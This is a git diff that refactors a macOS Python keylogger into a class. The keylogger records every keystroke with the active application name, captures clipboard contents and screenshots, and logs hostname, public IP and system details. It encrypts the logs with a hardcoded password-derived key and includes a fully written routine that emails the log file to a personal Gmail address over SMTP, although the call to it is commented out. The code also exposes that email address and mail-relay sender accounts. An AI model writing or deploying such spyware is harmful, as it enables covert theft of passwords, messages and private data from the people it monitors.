@@ -19,231 +19,254 @@ from cryptography.hazmat.primitives import hashes
 from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
 import base64
 
-directory = "/out"
-log = "log.txt"
-clipboard = "clipboard.txt"
-sys_info = "sysinfo.txt"
+class Keylogger:
+    def __init__(self, interval=15, iterations=5, buffer_size=20):
+        # Initalise variables
+        self.time_interval = interval
+        self.iterations = iterations
+        self.buffer_size = buffer_size
+        self.output_dir = "out"
+        self.log_file = os.path.join(self.output_dir, "/log.txt")
+        self.clipboard_file = os.path.join(self.output_dir, "/clipboard.txt")
+        self.sys_file = os.path.join(self.output_dir, "/sysinfo.txt")
+        
+        self.keys = []
+        self.apps = []
+        self.count = 0
+        self.current_time = 0
+        self.last_active_app = None
+        self.stopping_time = 0
 
-buffer_size = 20
-keys = []
-apps = []
-count = 0
-last_active_app = None
+    # Handles key press events, logging any pressed keys, 10 keys at a time
+    def on_press(self, key):
+        #global keys, count, apps, current_time
 
-time_interval = 15
-number_of_iterations = 5
-current_time = 0
+        # appends key pressed and current open application to respective lists
+        self.keys.append(key)
+        self.apps.append(NSWorkspace.sharedWorkspace().activeApplication()['NSApplicationName'])
+        self.count += 1
 
-# Handles key press events, logging any pressed keys, 10 keys at a time
-def on_press(key):
-    global keys, count, apps, current_time
-    #print (f"{key} pressed")
+        self.current_time = time.time()
 
-    # appends key pressed and current open application to respective lists
-    keys.append(key)
-    apps.append(NSWorkspace.sharedWorkspace().activeApplication()['NSApplicationName'])
-    count += 1
+        # once the lists have x amount of entries in them, call write to file and clear lists
+        if self.count == self.buffer_size:
+            self.write_file()
+            self.count = 0
+            self.keys.clear()
+            self.apps.clear()
 
-    current_time = time.time()
+    def on_release(self, key):
+        if key == Key.esc:
+            return False
+        if self.current_time > self.stopping_time:
+            return False
+        
+    def on_release(self, key):
+        if key == Key.esc or self.current_time > self.stopping_time:
+            # If there are remaining keys in the buffer, write them before stopping
+            if self.keys:
+                self.write_file()
+            return False
 
-    # once the lists have x amount of entries in them, call write to file and clear lists
-    if count == buffer_size:
-        write_file(keys, apps)
-        count = 0
-        keys.clear()
-        apps.clear()
+    # Converts each key press into a string and appends to the output file, with spaces being converted into a new line
+    def write_file(self):
+        # Logs each key press
+        with open("out/log.txt", "a") as file:
+            nl = "\n"
+            self.last_active_app = self.apps[0]
 
+            #loops through each key/app in keys/apps lists 
+            for n in range(len(self.keys)):
+                k = str(self.keys[n]).replace("'", "")
+                current_app = self.apps[n]
 
-def on_release(key):
-    if key == Key.esc:
-        return False
-    if current_time > stopping_time:
-        return False
+                # if current application changes, start logging on new line
+                if self.last_active_app != current_app:
+                    self.last_active_app = current_app
+                    timestamp = datetime.now().ctime()
+                    file.write(nl + timestamp + " " + current_app + " " + k)
+                # if space bar pressed, start logging on new line
+                elif k == 'Key.space':
+                    timestamp = datetime.now().ctime()
+                    file.write(nl + timestamp + " " + current_app + " ")
+                elif k.startswith("Key."):
+                    file.write(' ' + k + ' ')
+                else:
+                    file.write(k)
+                    
+    # Initialises log file with column names
+    def init_log_file(self):
+        # Creates out/log.txt if it doesnt already exist
+        if (os.path.isfile("out/log.txt") != True):
+            with open("out/log.txt", "x") as file:
+                print("log.txt not found, creating file.\n")
+                file.write("Timestamp, Current Application, Keys pressed\n")
 
-# Converts each key press into a string and appends to the output file, with spaces being converted into a new line
-def write_file(keys, apps):
-    # Logs each key press
-    with open("out/log.txt", "a") as file:
-        nl = "\n"
-        last_active_app = apps[0]
+    # Gets system information about host and logs it to out/sysinfo.txt
+    def log_sys_info(self):
+        # get hostname and public IP address
+        hostname = socket.gethostname()
+        try:
+            local_ip = socket.gethostbyname(hostname)
+            public_ip = get('https://api.ipify.org').content.decode('utf8').format(local_ip)
+        except Exception:
+            public_ip = local_ip
 
-        #loops through each key/app in keys/apps lists 
-        for n in range(buffer_size):
-            k = str(keys[n]).replace("'", "")
-            current_app = apps[n]
+        # gets system information
+        processor= platform.processor()
+        machine = platform.machine()
+        sys = platform.system()
+        vers = platform.version()
+        arch = platform.architecture()[0]
 
-            # if current application changes, start logging on new line
-            if (last_active_app != current_app):
-                last_active_app = current_app
-                timestamp = datetime.now().ctime()
+        sysinfo = (
+            f"--- System Information ---\n"
+            f"Timestamp: {datetime.now().ctime()}\n"
+            f"Hostname: {hostname}\n"
+            f"IPv4 Address: {public_ip}\n"
+            f"Processor: {processor}\n"
+            f"Machine: {machine}\n"
+            f"System: {sys}\n"
+            f"Version: {vers}\n"
+            f"Architecture: {arch}\n\n"
+        )
 
-                file.write(nl + timestamp + " " + current_app + " " + k)
+        # If file exists open in 'append' mode, else create file and write system information
+        if (os.path.isfile("out/sysinfo.txt") != True):
+            with open("out/sysinfo.txt", "x") as file:
+                print("sysinfo.txt not found, creating file.\n")
+                file.write(sysinfo)
+        else:
+            with open("out/sysinfo.txt", "a") as file:
+                file.write(sysinfo)
 
-            # if space bar pressed, start logging on new line
-            elif (k == 'Key.space'):
-                timestamp = datetime.now().ctime()
+    # Constructs and sends an email to specified recipient and attaches log files.
+    def send_email(self):
+        fromaddr = "MS_hPVXeT@test-p7kx4xw63p7g9yjr.mlsender.net"
+        toaddr = 'ibraheem.m.a04@gmail.com'
 
-                file.write(nl + timestamp + " " + current_app + " ")
-            elif (k.startswith("Key.")):
-                file.write(' ' + k + ' ')
-            else:
-                file.write(k)
-                
-# Initialises log file with column names
-def init_log_file():
-    # Creates out/log.txt if it doesnt already exist
-    if (os.path.isfile("out/log.txt") != True):
-        with open("out/log.txt", "x") as file:
-            print("log.txt not found, creating file.\n")
-            file.write("Timestamp, Current Application, Keys pressed\n")
+        # Construct message
+        msg = MIMEMultipart()
+        msg['From'] = "MS_W4tuaY@test-p7kx4xw63p7g9yjr.mlsender.net"
+        msg['To'] = 'ibraheem.m.a04@gmail.com'
+        msg['Subject'] = 'User Log'
+        body = 'This is a test'
 
-# Gets system information about host and logs it to out/sysinfo.txt
-def log_sys_info():
-    hostname = socket.gethostname()
-    ip = socket.gethostbyname(hostname)
-    ip = get('https://api.ipify.org').content.decode('utf8').format(ip)
+        msg.attach(MIMEText(body, 'plain'))
 
-    processor= platform.processor()
-    machine = platform.machine()
-    sys = platform.system()
-    vers = platform.version()
-    arch = platform.architecture()[0]
+        # Open and attach file
+        filename = "log.txt"
+        attachment = open("out/log.txt", "rb")
 
-    sysinfo = (
-        f"Hostname: {hostname}\n"
-        f"IPv4 Address: {ip}\n"
-        f"Processor: {processor}\n"
-        f"Machine: {machine}\n"
-        f"System: {sys}\n"
-        f"Version: {vers}\n"
-        f"Architecture: {arch}\n\n"
-    )
+        # instance of MIMEBase and named as p
+        p = MIMEBase('application', 'octet-stream')
 
-    # If file exists open in 'append' mode, else create file and write system information
-    if (os.path.isfile("out/sysinfo.txt") != True):
-        with open("out/sysinfo.txt", "x") as file:
-            print("sysinfo.txt not found, creating file.\n")
-            file.write(sysinfo)
-    else:
-        with open("out/sysinfo.txt", "a") as file:
-            file.write(sysinfo)
+        # attach file
+        p.set_payload((attachment).read())
+        encoders.encode_base64(p)
+        p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
+        msg.attach(p)
 
-# Constructs and sends an email to specified recipient and attaches log files.
-def send_email():
-    fromaddr = "MS_hPVXeT@test-p7kx4xw63p7g9yjr.mlsender.net"
-    toaddr = 'ibraheem.m.a04@gmail.com'
+        # creates SMTP session
+        s = smtplib.SMTP('smtp.mailersend.net', 587)
+        # start TLS for security
+        s.starttls()
 
-    # Construct message
-    msg = MIMEMultipart()
-    msg['From'] = "MS_W4tuaY@test-p7kx4xw63p7g9yjr.mlsender.net"
-    msg['To'] = 'ibraheem.m.a04@gmail.com'
-    msg['Subject'] = 'User Log'
-    body = 'This is a test'
+        # Authentication
+        s.login(fromaddr,os.environ['mail_pass'])
+        # Coverts the Multipart msg into a string
+        text = msg.as_string()
+        # sending the mail
+        s.sendmail(fromaddr, toaddr, text)
 
-    msg.attach(MIMEText(body, 'plain'))
+        # terminating the session
+        s.quit()
 
-    # Open and attach file
-    filename = "log.txt"
-    attachment = open("out/log.txt", "rb")
+    # Gets whatever is currently in users clipboard and saves it to clipboard.txt
+    def log_clipboard(self):
+        pb = NSPasteboard.generalPasteboard()
+        pbstring = pb.stringForType_(NSStringPboardType)
 
-    # instance of MIMEBase and named as p
-    p = MIMEBase('application', 'octet-stream')
+        if (os.path.isfile("out/clipboard.txt") != True):
+            with open("out/clipboard.txt", "x") as file:
+                print("clipboard.txt not found, creating file.\n")
+                file.write(f"Clipboard Log @ {datetime.now().ctime()}")
+                file.write(pbstring + "\n")
+        else:
+            with open("out/clipboard.txt", "a") as file:
+                file.write(f"Clipboard Log @ {datetime.now().ctime()}\n")
+                file.write(pbstring + "\n\n")
 
-    # attach file
-    p.set_payload((attachment).read())
-    encoders.encode_base64(p)
-    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
-    msg.attach(p)
+    # takes a screenshot and saves it to /out directory
+    def take_screenshot(self, iteration_count):
+        screenshot = ImageGrab.grab()
+        screenshot_path = os.path.join(self.output_dir, f"screenshot_{iteration_count}.png")
+        screenshot.show()
+        screenshot.save(screenshot_path)
 
-    # creates SMTP session
-    s = smtplib.SMTP('smtp.mailersend.net', 587)
-    # start TLS for security
-    s.starttls()
+    # generates a key based off a chosen password and saves it to 'key.txt'
+    def get_key(self):
+        password = "password".encode()
+        salt = b'\x89\x07\x06\xc6i\x99\xd2\x950\xb5Sje\xe4\xd9\xff'
 
-    # Authentication
-    s.login(fromaddr,os.environ['mail_pass'])
-    # Coverts the Multipart msg into a string
-    text = msg.as_string()
-    # sending the mail
-    s.sendmail(fromaddr, toaddr, text)
+        # uses a deterministic key derivation function to derive a key from the password and salt
+        kdf = PBKDF2HMAC(
+                algorithm = hashes.SHA256(),
+                length = 32,
+                salt = salt,
+                iterations = 10000,
+                backend = default_backend()
+        )
+        return base64.urlsafe_b64encode(kdf.derive(password))
 
-    # terminating the session
-    s.quit()
+    # Loops through all files in '/out' and encrypts each file
+    def encrypt_files(self):
+        key = self.get_key()
+        #dir = "/Users/ibrah/Documents/key-logger/out"
+        fernet = Fernet(key)
 
-# Gets whatever is currently in users clipboard and saves it to clipboard.txt
-def log_clipboard():
-    pb = NSPasteboard.generalPasteboard()
-    pbstring = pb.stringForType_(NSStringPboardType)
+        for filename in os.listdir(self.output_dir):
+            if filename.endswith('.txt'):
+                filepath = os.path.join(self.output_dir, filename)
+                with open(filepath, "rb") as file:
+                    data = file.read()
+                encrypted_data = fernet.encrypt(data)
+                with open(filepath, "wb") as file:
+                    file.write(encrypted_data)
 
-    if (os.path.isfile("out/clipboard.txt") != True):
-        with open("out/clipboard.txt", "x") as file:
-            print("clipboard.txt not found, creating file.\n")
-            file.write(pbstring + "\n")
-    else:
-        with open("out/clipboard.txt", "a") as file:
-            file.write(pbstring + "\n")
+# create function to create all files
 
-def take_screenshot(iteration_count):
-    screenshot = ImageGrab.grab()
-    #screenshot.show()
-    screenshot.save(f"out/screenshot{iteration_count}.png")
+    def run(self):
+        self.init_log_file()
+        self.log_sys_info()
 
-# generates a key based off a chosen password and saves it to 'key.txt'
-def get_key():
-    password = "password".encode()
-    salt = b'\x89\x07\x06\xc6i\x99\xd2\x950\xb5Sje\xe4\xd9\xff'
+        iteration_count = 0
 
-    kdf = PBKDF2HMAC(
-            algorithm = hashes.SHA256(),
-            length = 32,
-            salt = salt,
-            iterations = 10000,
-            backend = default_backend()
-    )
-    key = base64.urlsafe_b64encode(kdf.derive(password))
+        while iteration_count < self.iterations:
+            print(f"Starting iteration {iteration_count} \n")
+            with Listener(
+                        on_press=self.on_press,
+                        on_release=self.on_release) as listener:
+                print("Key Logger is running\nPressing any key will write it to out/log.txt\n")
+                listener.join()
 
-    return key
+            self.log_clipboard()
+            self.take_screenshot(iteration_count)
 
-def encrypt_files(key):
-    dir = "/Users/ibrah/Documents/key-logger/out"
-
-    # Loops through all files in /out and encrypt each file
-    for filename in os.listdir(dir):
-        if filename.endswith('.txt'):
-            with open(os.path.join(dir, filename), "rb") as file:
-                data = file.read()
-            fernet = Fernet(key)
-            encrypted = fernet.encrypt(data)
-            with open(os.path.join(dir, filename), "wb") as file:
-                file.write(encrypted)
-
-if __name__ == "__main__":
-    iteration_count = 0
-
-    init_log_file()
-    log_sys_info()
-
-    key = get_key()
-    encrypt_files(key)
-    #decrypt_files(key)
-
-    current_time = time.time()
-    stopping_time = current_time + time_interval
-
-    while (iteration_count < number_of_iterations):
-        with Listener(
-                      on_press=on_press,
-                      on_release=on_release) as listener:
-            print("Key Logger is running\nPressing any key will write it to out/log.txt\n")
-            listener.join()
-
-        if current_time > stopping_time:
-            #send_email()
-            log_clipboard()
-            take_screenshot(iteration_count)
-
-            print("Iterated\n")
+            print(f"finished iteration {iteration_count} and logged information \n")
 
             iteration_count += 1
-            current_time = time.time()
-            stopping_time = current_time + time_interval
+            self.current_time = time.time()
+            self.stopping_time = self.current_time + self.time_interval
+
+        print("\nAll iterations complete.")
+        print("Encrypting log files...")
+        self.encrypt_files()
+        # self.send_email()
+        print("Keylogger finished.")
+
+
+if __name__ == "__main__":
+    keylogger = Keylogger()
+    keylogger.run()
+    
